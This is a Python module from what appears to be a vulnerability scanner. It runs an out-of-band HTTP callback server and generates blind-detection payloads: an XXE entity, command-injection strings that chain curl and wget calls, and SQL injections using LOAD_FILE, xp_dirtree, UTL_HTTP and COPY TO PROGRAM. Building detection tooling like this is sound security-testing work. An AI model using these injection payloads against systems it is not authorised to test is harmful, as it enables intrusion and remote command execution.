"""
core/oob_server.py
Out-of-Band HTTP callback server for blind vulnerability detection.
"""
from __future__ import annotations

import socket
import threading
import time
import uuid
from collections import defaultdict
from http.server import BaseHTTPRequestHandler, HTTPServer
from typing import Dict, List


class EnhancedOOBServer:
    """HTTP OOB callback server — tracks interactions by unique identifier."""

    def __init__(self, port: int = 8888):
        self.http_port = port
        self.interactions: Dict[str, List[Dict]] = defaultdict(list)
        self.http_server = None
        self.http_thread = None
        self.running = False
        self.verbose = False

    def start_http(self):
        if self.running:
            return

        interactions = self.interactions
        verbose = self.verbose

        class OOBHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                identifier = self.path.strip('/')
                interactions[identifier].append({
                    'timestamp': time.time(),
                    'type': 'http_get',
                    'path': self.path,
                    'headers': dict(self.headers),
                    'remote_addr': self.client_address[0],
                })
                if verbose:
                    print(f"[OOB] GET from {self.client_address[0]}: {self.path}")
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'OOB Hit Recorded')

            def do_POST(self):
                length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(length)
                identifier = self.path.strip('/')
                interactions[identifier].append({
                    'timestamp': time.time(),
                    'type': 'http_post',
                    'path': self.path,
                    'headers': dict(self.headers),
                    'body': body.decode('utf-8', errors='ignore'),
                    'remote_addr': self.client_address[0],
                })
                if verbose:
                    print(f"[OOB] POST from {self.client_address[0]}: {self.path}")
                self.send_response(200)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(b'OOB Hit Recorded')

            def log_message(self, fmt, *args):
                pass  # suppress default logs

        try:
            self.http_server = HTTPServer(('', self.http_port), OOBHandler)
            self.http_thread = threading.Thread(
                target=self.http_server.serve_forever, daemon=True
            )
            self.http_thread.start()
            self.running = True
            print(f"[+] OOB HTTP Server started on port {self.http_port}")
        except Exception as e:
            print(f"[-] Could not start OOB server: {e}")

    def stop(self):
        if self.http_server:
            self.http_server.shutdown()
            self.running = False

    def generate_identifier(self) -> str:
        return uuid.uuid4().hex[:12]

    def check_interaction(self, identifier: str, timeout: float = 5.0) -> bool:
        start = time.time()
        while time.time() - start < timeout:
            if self.interactions.get(identifier):
                return True
            time.sleep(0.1)
        return False

    def get_interactions(self, identifier: str) -> List[Dict]:
        return self.interactions.get(identifier, [])

    def get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"

    def get_oob_url(self, identifier: str) -> str:
        return f"http://{self.get_local_ip()}:{self.http_port}/{identifier}"

    # ── Payload generators ──────────────────────────────────────────────────

    def get_xxe_payload(self, identifier: str) -> str:
        url = self.get_oob_url(identifier)
        return (
            f'<?xml version="1.0" encoding="UTF-8"?>'
            f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{url}"> %xxe;]>'
            f'<root>test</root>'
        )

    def get_ssrf_payload(self, identifier: str) -> str:
        return self.get_oob_url(identifier)

    def get_blind_cmdi_payload(self, identifier: str) -> List[str]:
        url = self.get_oob_url(identifier)
        return [
            f"; curl {url}",
            f"| curl {url}",
            f"&& curl {url}",
            f"; wget -qO- {url}",
            f"| wget -qO- {url}",
            f"`curl {url}`",
            f"$(curl {url})",
        ]

    def get_blind_sqli_payload(self, identifier: str, db_type: str = "mysql") -> str:
        url = self.get_oob_url(identifier)
        ip = self.get_local_ip()
        payloads = {
            'mysql':      f"' AND LOAD_FILE('\\\\\\\\{ip}\\\\{identifier}')--",
            'mssql':      f"'; EXEC master..xp_dirtree '{url}'--",
            'oracle':     f"' AND UTL_HTTP.REQUEST('{url}') IS NULL--",
            'postgresql': f"'; COPY (SELECT '') TO PROGRAM 'curl {url}'--",
        }
        return payloads.get(db_type, payloads['mysql'])
